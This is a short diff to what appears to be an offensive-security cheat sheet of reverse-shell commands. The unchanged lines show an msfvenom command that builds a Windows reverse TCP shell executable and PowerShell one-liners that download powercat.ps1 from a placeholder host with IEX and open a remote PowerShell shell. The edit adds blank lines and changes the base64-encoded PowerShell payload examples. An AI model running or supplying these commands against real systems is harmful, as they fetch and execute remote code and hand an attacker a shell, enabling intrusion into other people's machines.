@@ -18,6 +18,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <fil
 IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
 
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
+
+
 ```
 
 ###### Base64 Encode
@@ -33,7 +35,8 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
 
 #PowerShell Command
-powershell -enc "<base64_shell_payload>"
+powershell -enc "<base64>"
+powershell -a "-enc <base64>"
 ```
 
 ##### ASP / ASPX
